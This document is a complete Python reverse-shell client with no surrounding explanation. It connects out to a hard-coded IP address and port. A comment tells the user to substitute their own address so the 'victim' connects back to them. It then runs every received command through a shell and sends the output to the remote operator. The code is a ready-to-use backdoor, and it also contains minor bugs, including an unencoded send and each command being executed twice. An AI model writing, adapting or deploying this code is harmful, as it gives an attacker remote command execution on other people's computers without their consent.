import socket
import subprocess
import os
req = socket.socket()
req.connect(("192.168.1.26",12348)) #you have to change this ip to your ip adress so victim can connect you
print(socket.gethostname())
while 1 :
        try:
                mesaj = req.recv(1024)
                command = mesaj.decode("utf-8")
                if command[:2] == "cd":
                 os.chdir(command[3:])
                 req.send(os.getcwd().encode("utf-8"))
                 continue
                if command[:5] == "mkdir":
                     os.mkdir(command[6:])
                     req.send("File is created ! ")
                     continue
                subprocess.Popen(command, shell=True)
                x = subprocess.check_output(command, shell=True)
                if(x==""):
                    req.send("Command Injected ! ".encode("utf-8"))
                    continue
                else:
                    req.send(x)
        except:        
                req.send("an error occured ! ".encode("utf-8"))                


